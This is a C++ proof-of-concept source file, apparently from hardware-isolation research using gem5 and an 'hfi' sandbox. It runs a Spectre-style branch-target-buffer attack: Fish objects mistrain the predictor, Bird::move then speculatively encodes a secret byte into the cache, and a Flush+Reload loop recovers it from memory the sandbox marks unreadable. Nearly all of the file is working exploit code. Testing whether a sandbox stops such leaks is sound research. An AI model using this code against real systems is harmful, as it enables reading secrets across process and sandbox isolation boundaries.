#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

extern "C" {
#include "libcache/cacheutils.h"
}

#include "../hw_isol_gem5/tests/test-progs/hfi/hfi.h"

#define SECRET 'S'

// Base class
class Animal {
public:
  virtual void move() {
  }
};

// Bird contains the secret
class Bird : public Animal {
private:
  char secret;
  char padding[16];
public:
  Bird() {
    secret = SECRET;
  }
  void move() {
     // nop
    cache_encode(secret);
  }
};

// Class that contains the function to leak data
class Fish : public Animal {
private:
  char data;
  char padding[16];
public:
  Fish() {
    data = 'F';
  }
  void move() {
    // Encode data in the cache
    cache_encode(data);
  }
};

// Function so that we always call animal->move from the same virtual address
// required for indexing always the same BTB entry
void move_animal(Animal* animal) {
  animal->move();
}



size_t round_to_next_pow2(size_t val) {
  size_t power = 1;
  while(power < val) {
    power *= 2;
  }
  return power;
}

int main(int argc, char **argv) {

  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  
  pagesize = sysconf(_SC_PAGESIZE);
  char* _mem = (char*)malloc(pagesize*300);
  mem = (char*)(((size_t)_mem & ~(pagesize-1)) + pagesize*2);

  Fish* fish = new Fish();
  Bird* bird = new Bird(); // contains secret


  hfi_sandbox sandbox;
  memset(&sandbox, 0, sizeof(hfi_sandbox));

  sandbox.is_trusted_sandbox = false;

  sandbox.code_ranges[0].base_mask = 0;
  sandbox.code_ranges[0].ignore_mask = 0;
  sandbox.code_ranges[0].executable = 1;

  // First region --- mark private_data as inaccessible
  const size_t private_data_len = 1;
  const size_t private_data_len_pow2 = round_to_next_pow2(private_data_len);
  sandbox.data_ranges[0].base_mask = reinterpret_cast<uintptr_t>(bird);
  sandbox.data_ranges[0].ignore_mask = ~reinterpret_cast<uint64_t>(private_data_len_pow2 - 1);
  sandbox.data_ranges[0].readable = 0;
  sandbox.data_ranges[0].writeable = 0;

  // Second region --- mark all (remaining) addresses as accessible
  sandbox.data_ranges[1].base_mask = 0;
  sandbox.data_ranges[1].ignore_mask = 0;
  sandbox.data_ranges[1].readable = 1;
  sandbox.data_ranges[1].writeable = 1;

  hfi_set_sandbox_metadata(&sandbox);
  hfi_enter_sandbox();

  puts("Running poc after hfi protections");


  char* ptr = (char*)((((size_t)move_animal)) & ~(pagesize-1));
  mprotect(ptr, pagesize * 2, PROT_READ | PROT_WRITE | PROT_EXEC);

  memset(mem, 0, pagesize * 290);
  maccess((void*)move_animal);

  ptr[0] = ptr[0];

  printf("Works if %c appears\n", SECRET);
  while(1) {
    nospec();
    // Mistrain the BTB for Fish
    for(int j = 0; j < 1000; j++) {
      move_animal(fish);
    }
    // Flush our shared memory
    flush_shared_memory();
    mfence();

    // Increase misspeculation chance
    flush(bird);
    mfence();

    nospec();
    // Leak bird secret
    move_animal(bird);

    // Recover data from the covert channel
    for(int i = 1; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // prefetcher
      if(flush_reload(mem + mix_i * pagesize)) {
        if((mix_i >= 'A' && mix_i <= 'Z')) {
          printf("%c ", mix_i);
        }
        fflush(stdout);
        // sched_yield();
      }
    }
  }

  hfi_exit_sandbox();
}
